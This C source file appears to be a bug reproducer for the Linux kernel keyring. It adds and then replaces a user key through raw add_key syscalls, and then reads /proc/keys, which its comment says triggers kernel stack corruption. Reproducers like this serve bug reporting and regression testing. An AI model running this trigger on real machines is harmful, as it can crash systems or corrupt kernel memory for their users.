
#define _GNU_SOURCE

#include <stdio.h>
#include <errno.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#define DESC "xxx:yyy"
#define PAYLOAD1 "password"
#define PAYLOAD2 "deadcafe"

typedef int32_t key_serial_t;

static int kernel_keyring_syscalls(const char *payload)
{
	key_serial_t kid;

	/* add to user keyring */
	printf("adding key with payload %s\n", payload);
	kid = syscall(__NR_add_key, "user", DESC, payload, strlen(payload), -4);
	if (kid < 0)
		return 1;

	printf("Added key with serial %d.\n", kid);

	return 0;
}

int main(void)
{
	char buf[4096];
	int fd;

	/* add key with payload1 */
	if (kernel_keyring_syscalls(PAYLOAD1)) {
		fprintf(stderr, "the reproducer failed\n");
		return EXIT_FAILURE;
	}

	/* replace the key above with new one having same description and different payload2 */
	if (kernel_keyring_syscalls(PAYLOAD2)) {
		fprintf(stderr, "the reproducer failed\n");
		return EXIT_FAILURE;
	}

	fd = open("/proc/keys", O_RDONLY);
	if (fd < 0) {
		fprintf(stderr, "can't open /proc/keys for read.\n");
		return EXIT_FAILURE;
	}

	/* following /proc/keys read will expose (or maybe cause?) kernel stack corruption */
	read(fd, buf, 4096);

	printf("If you reached this text, the reproducer failed to trigger the bug.\n");

	close(fd);

	return EXIT_SUCCESS;
}
